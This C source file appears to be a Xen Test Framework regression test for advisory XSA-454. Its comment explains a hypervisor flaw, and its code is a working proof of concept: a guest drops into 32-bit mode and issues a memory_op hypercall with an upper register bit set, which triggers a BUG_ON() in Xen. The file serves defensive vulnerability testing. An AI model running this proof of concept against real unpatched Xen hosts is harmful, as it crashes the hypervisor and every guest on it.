/**
 * @file tests/xsa-454/main.c
 * @ref test-xsa-454
 *
 * @page test-xsa-454 XSA-454
 *
 * Advisory: [XSA-454](https://xenbits.xen.org/xsa/advisory-454.html)
 *
 * Intel and AMD both state that upper half of the GPRs are undefined after
 * leaving 64bit mode.  Despite this, they're typically preserved until the
 * next explicit write of the GPR, because this is the simplest strategy.
 *
 * At the time of XSA-454, HYPERCALL_memory_op()'s compatibility handler makes
 * an unconditional hypercall continuation after the native handler returns,
 * in order to simplify later logic in some subops.
 *
 * This means that hypercall_xlat_continuation() can the preserved upper bits
 * of the GPRs while the vCPU is compatibility mode, and it makes some
 * incorrect assertions about GPR state using BUG_ON().
 *
 * Pick a simple subop (XENMEM_maximum_ram_page takes no argument) and set an
 * upper bit in @%rbx (becomes the cmd parameter in Xen).  This is sufficient
 * to trigger the bad BUG_ON().
 *
 * Note: The fixes for XSA-454 both truncated all registers for compatibility
 * mode guests, and swapped the BUG_ON() for a domain_crash().  This test
 * can't distinguish between domain_crash() and BUG_ON(), but as both patches
 * were taken together, this shouldn't matter.
 *
 * @see tests/xsa-454/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-454 PoC";

void test_main(void)
{
    unsigned long tmp;

    /* Allow us to use the stack in __KERN_CS32 */
    write_ss(GDTE_DS32_DPL0 << 3);

    asm volatile (/* Drop into a 32bit compat code segment. */
                  "push $%c[cs32];"
                  "push $1f;"
                  "lretq; 1:"

                  ".code32;"
                  "start_32bit:;"

                  /* Compat hypercall_memory_op(XENMEM_maximum_ram_page, NULL); */
                  "call HYPERCALL_memory_op;"

                  /* Return to 64bit. */
                  "ljmpl $%c[cs], $1f;"
                  "end_32bit:;"

                  ".code64; 1:"
                  : "=a" (tmp),
                    "=b" (tmp),
                    "=c" (tmp)
                  : "b" (XENMEM_maximum_ram_page | (1UL << 32)),
                    "c" (NULL),
                    [cs32] "i" (__KERN_CS32),
                    [cs]   "i" (__KERN_CS));

    /* If Xen is still alive, it didn't hit a BUG(). */
    xtf_success("Success: Not vulnerable to XSA-454\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
